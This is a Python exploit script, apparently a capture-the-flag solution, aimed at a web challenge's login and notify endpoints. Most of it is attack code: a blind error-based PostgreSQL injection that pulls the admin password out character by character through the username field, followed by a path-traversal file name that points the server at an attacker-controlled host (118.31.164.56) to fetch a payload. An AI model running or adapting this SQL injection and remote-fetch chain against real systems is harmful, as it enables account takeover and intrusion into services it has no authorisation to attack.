import requests

# NOTE: requires a remote ftp server with port 21 open
# see exploit.sh, or otherwise run it first

CHALL_URL = "http://localhost:8080"
# CHALL_URL = "http://47.89.225.36:36207"
OUR_DOMAIN = "118.31.164.56"

charset = "0123456789abcdef-!ghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_{}%@#%&*()_=,.<>/\\?[];"

def get_password():
    return "xxxxxxx"
    # cur_passwd = "WeakPass"
    # cur_passwd = ""
    raw_payload = f"""a' || """
    for _ in range(10):
        raw_payload += "'b' || "
    raw_payload += "1/int4(textregexeq(substring(passwd,START,END),'TEST')) || "
    raw_payload += "'a"
    for i in range(
        len(cur_passwd), len("WeakPass73d0bd16-bcc7-11ee-9392-0242ac110004!!")
    ):
        print(cur_passwd)
        for c in charset:
            attempt = (
                raw_payload.replace("START", str(i + 1))
                .replace("END", str(1))
                .replace("TEST", c)
            )
            r = requests.post(
                f"{CHALL_URL}/login", data={"username": attempt, "passwd": "idk"}
            )
            if "Incorrect Username/Password" in r.text:
                cur_passwd += c
                break
    return cur_passwd

def main():
    # prep ftp server
    passwd = get_password()
    print(passwd)
    s = requests.Session()
    r = s.post(
        f"{CHALL_URL}/login", headers={}, data={"username": "admin", "passwd": passwd}
    )
    print(r.text)
    if "post_message" not in r.text:
        print("login failed")
        exit()
    
    path = f"..\\..\\{OUR_DOMAIN}/payload?.txt"
    r = s.get(f"{CHALL_URL}/notify", params={"fname": path})
    print(r.text)

if __name__ == "__main__":
    main()